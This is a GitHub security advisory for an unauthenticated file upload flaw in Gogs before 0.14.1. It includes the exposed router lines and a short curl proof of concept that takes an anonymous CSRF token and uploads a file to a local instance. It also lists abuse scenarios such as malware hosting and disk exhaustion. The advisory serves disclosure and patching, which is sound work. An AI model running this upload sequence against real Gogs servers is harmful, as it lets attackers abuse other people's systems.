# [M] Unauthenticated File Upload in Gogs

## Summary
Severity: Medium
Advisory: GHSA-fc3h-92p8-h36f
CVE: CVE-2026-25242
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-17
Source: https://github.com/advisories/GHSA-fc3h-92p8-h36f
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.1

## Details
Security Advisory:Unauthenticated File Upload in Gogs
Vulnerability Type: Unauthenticated File Upload
Date: Aug 5, 2025
Discoverer: OpenAI Security Research

## Summary
Gogs exposes unauthenticated file upload endpoints by default. When the global RequireSigninView setting is disabled (default), any remote user can upload arbitrary files to the server via /releases/attachments and /issues/attachments. This enables the instance to be abused as a public file host, potentially leading to disk exhaustion, content hosting, or delivery of malware. CSRF tokens do not mitigate this attack due to same-origin cookie issuance.

## Affected Versions

- Software: [Gogs](https://github.com/gogs/gogs/tree/main)
- Confirmed Version(s): 28f83626d4ed0aa7b89493be2ea8b79ca038331e
- Likely Affected: All versions since 2020-04-05 with unauthenticated attachments endpoints
- Introduced Commit: 07818d5fa

## Vulnerability Details
The web.go router exposes the following endpoints under the ignSignIn route group:

### Vulnerable Code Snippet
```
m.Post("/issues/attachments", repo.UploadIssueAttachment)
m.Post("/releases/attachments", repo.UploadReleaseAttachment)
```
These endpoints are accessible by unauthenticated users if the configuration variable RequireSigninView is false (default). This allows arbitrary file uploads to data/attachments, returning a UUID in response.

While CSRF protection is enabled, attackers can obtain a valid token anonymously from the site and use it in the upload request without authentication.
## Description
Anonymous file upload using only default configuration and a CSRF token obtained from the homepage.
## POC
```
# Run Gogs docker 
docker start gogs

# Software will be run on http://localhost:10880/. Finish the setup with local Sqlite database

# Get CSRF cookie into a jar
curl -sS -c cookies.txt http://localhost:10880/ -o /dev/null

# Extract the _csrf value from the jar
CSRF="$(awk '$6=="_csrf"{print $7}' cookies.txt | tail -n1)"

# Upload the file, sending cookie jar + header
curl -sS \
  -b cookies.txt -c cookies.txt \
  -H "X-CSRF-Token: $CSRF" \
  -H "Referer: http://localhost:10880/" \
  -F "file=@image.png" \
  http://localhost:10880/issues/attachments

 => {"uuid":"<UUID>"}
```
The attachment will be available at: http://localhost:10880/attachments/<uuid>

## Impact
**Unrestricted File Upload:** Attackers can store arbitrary content on the server.
**Denial-of-Service:** Repeated uploads can exhaust disk space.
**Malware Hosting:** Gogs may inadvertently serve attacker-hosted payloads under its domain.

## Realistic Exploitation Scenarios

- Spammers or malicious actors use the Gogs instance to host phishing payloads or malware.
- Attackers fill up disk with repeated uploads.
- Attackers use hosted Gogs instances as public file dumps (e.g., for P2P, exfiltration)

## Potential Impact
This unauthenticated upload vector effectively turns any Gogs instance into a file hosting platform open to the public. This is especially dangerous for production or Internet-exposed installations. The combination of no login requirement, wildcard MIME support, and unrestricted access to attachments enables both resource abuse and potential malware distribution.

## Timeline

- August 2025: Discovered via GPT5
- August 2025: Reproduced and confirmed via PoC and sanitizer
- Aug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-fc3h-92p8-h36f
- https://nvd.nist.gov/vuln/detail/CVE-2026-25242
- https://github.com/gogs/gogs/pull/8128
- https://github.com/gogs/gogs/commit/628216d5889fcb838c471f4754f09b935d9cd9f3
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.1
